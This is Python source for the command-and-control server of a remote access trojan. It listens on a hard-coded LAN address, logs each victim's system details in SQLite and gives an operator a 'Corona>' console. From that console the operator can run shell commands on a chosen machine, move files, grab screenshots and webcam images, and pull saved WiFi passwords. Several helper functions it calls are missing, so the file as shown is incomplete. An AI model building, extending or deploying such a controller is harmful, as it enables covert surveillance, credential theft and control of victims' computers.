import os
import re
import time
import socket
import sqlite3
import threading
from prettytable import from_db_cursor

# ASCII Art & User Guide removed for brevity

def print_banner():
    # Banner and user guide printing logic here
    pass

def create_socket():
    try:
        global sock
        port, host = 4000, "192.168.43.172"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(200)
        print("[+] Listening for a connection... \n")
    except socket.error as err:
        print(f"[-] Error creating socket: {err}")



def accept_connections(db_conn):
    while True:
        try:
            conn, addr = sock.accept()
            conn.setblocking(True)
            client_info = format_client_info(conn.recv(1024).decode())

            print(client_info)
            ip = re.findall("'(.*?)'", str(addr))[0]

            store_client_info(db_conn, ip, conn, client_info)
            print(f"\n[+] Node {addr} has just connected!!!")
        except Exception as e:
            print(f"[-] Error connecting to client: {e}")




def create_database():
    db_conn = sqlite3.connect('clientDatabase.db', check_same_thread=False)
    
    with db_conn:

        db_conn.execute("""CREATE TABLE IF NOT EXISTS connectedClients(
                            Client_ID INTEGER PRIMARY KEY AUTOINCREMENT,
                            Date_Joined DATETIME DEFAULT CURRENT_TIMESTAMP,
                            IP_Address TEXT,
                            System TEXT,
                            Node_Name TEXT,
                            Release TEXT,
                            Version TEXT,
                            Processor TEXT);""")

        db_conn.execute('DELETE FROM connectedClients;')

    return db_conn




def store_client_info(db_conn, ip, conn, client_sysinfo_list):

    with db_conn:
        db_conn.execute("INSERT INTO connectedClients(IP_Address, System, Node_Name, Release, Version, Processor) VALUES(?, ?, ?, ?, ?, ?)",
                        (ip, *client_sysinfo_list))
    client_conn_object.append(conn)




def get_client_info(db_conn):
    with db_conn:
        cursor = db_conn.execute("SELECT * FROM connectedClients")
        print(from_db_cursor(cursor))




def format_client_info(client_info):
    return re.findall(r"'(.*?)'", client_info)



def get_target_client(target_id):
    try:
        return client_conn_object[target_id]
    except IndexError:
        print("[-] Client does not exist!!!")
        return None



def client_session(client_conn):
    send_null(client_conn)
    while True:
        cmd = input()
        if cmd == 'quit':
            print("[+]Closing Session....")
            break
        elif cmd == "":
            send_null(client_conn)
        elif "get" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                usrFile = client_conn.recv(1024).decode()
                data = client_conn.recv(1024).decode()
                if "File does not exist!!!" not in data:
                    receive_file(client_conn, usrFile)
                    print(str(data), end="")
                else:
                    print(data)
            except:
                print("[-]Connection terminated!!!")
                break
        elif "send" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                send_file(client_conn, cmd[5:])
                data = client_conn.recv(1024).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "screenshot" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(1024).decode()
                receive_client_image(client_conn)
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "camshot" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(1024).decode()
                receive_client_image(client_conn)
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif cmd == "wifi_passwords":
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        else:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break

def main():
    db_conn = create_database()
    threading.Thread(target=accept_connections, args=(db_conn,)).start()
    while True:
        cmd = input("\033[1;32mCorona>\033[1;m").lower()
        if cmd == 'list':
            get_client_info(db_conn)
        elif 'select' in cmd:
            target_id = int(''.join(filter(str.isdigit, cmd)))
            client_conn = get_target_client(target_id)
            if client_conn:
                client_session(client_conn)
        else:
            print("[-] Invalid command!!!")



if __name__ == "__main__":
    print_banner()
    create_socket()
    main()
